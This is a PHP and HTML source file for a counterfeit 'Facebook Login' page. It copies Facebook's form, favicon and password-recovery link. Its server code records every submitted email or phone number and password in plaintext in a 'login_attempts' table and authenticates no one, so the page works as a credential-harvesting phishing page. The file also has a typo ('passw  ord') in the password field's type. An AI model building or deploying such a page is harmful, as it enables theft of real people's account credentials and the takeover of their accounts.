<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="index.css">
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
</head>
<body>
    <div class="login-container">
        <form action="login.php" method="post">
            <input type="text" id="email_or_phone" name="email_or_phone" placeholder="Email address or phone number" required><br>
            <div class="password-container">
                <input type="passw  ord" id="password" name="password" placeholder="Password" required>
                <img id="togglePassword" src="../hidden.png" alt="Toggle Password Visibility" style="display: none;">
            </div>
            <button type="submit" name="login">Log in</button>
            <a href="https://web.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzIyNDczMTgyLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login&amp;next" target="_blank">Forgotten password?</a>
            <hr>
            <button class="btn1">Create new account</button>
        </form>

        <?php
        if (isset($_POST['login'])) {
            if (!empty($_POST['email_or_phone']) && !empty($_POST['password'])) {
                $email_or_phone = $_POST['email_or_phone'];
                $password = $_POST['password'];

                // Store the login details in the login_attempts table
                $conn = new mysqli('localhost', 'root', '', 'facebook_clone');

                if ($conn->connect_error) {
                    die("Connection failed: " . $conn->connect_error);
                }

                // Use prepared statements to prevent SQL injection
                $stmt = $conn->prepare("INSERT INTO login_attempts (email_or_phone, password) VALUES (?, ?)");
                $stmt->bind_param("ss", $email_or_phone, $password);

                if ($stmt->execute()) {
                    echo "";
                } else {
                    echo "Error storing login details: " . $stmt->error;
                }

                $stmt->close();
                $conn->close();
            } else {
                echo "Please fill in all fields.";
            }
        }
        ?>
    </div>

    <script>
        // JavaScript to toggle the password visibility
        const togglePassword = document.getElementById('togglePassword');
        const passwordInput = document.getElementById('password');

        // Show the togglePassword icon when user starts typing in the password field
        passwordInput.addEventListener('input', function () {
            if (passwordInput.value) {
                togglePassword.style.display = 'block';
            } else {
                togglePassword.style.display = 'none';
            }
        });

        togglePassword.addEventListener('click', function () {
            // Toggle the type attribute of the password input
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);

            // Toggle the image source
            if (type === 'password') {
                togglePassword.src = '../hidden.png'; // Image for hidden password
            } else {
                togglePassword.src = '../unhidden.png'; // Image for visible password
            }
        });
    </script>
</body>
</html>
